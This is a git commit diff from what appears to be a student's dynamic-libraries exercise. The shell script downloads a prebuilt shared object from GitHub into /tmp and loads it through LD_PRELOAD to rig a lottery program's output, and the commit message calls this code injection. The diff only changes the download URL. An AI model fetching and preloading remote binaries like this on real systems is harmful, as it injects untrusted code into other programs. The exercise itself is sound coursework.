65b78682cdb9fb67c262ab582b5adfa93b55f1ea
ZahraJkhan <zahrajid@gmail.com>
2022-12-13 04:01:32 -0800

    Code injection: Win the Giga Millions

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp https://github.com/ZahraJkhan/alx-low_level_programming/tree/master/0x18-dynamic_libraries/putshack.so
+wget -P /tmp https://github.com/holbertonschool/0x18.c/blob/master/101-md5_gm/putshack.so
 export LD_PRELOAD=/tmp/putshack.so
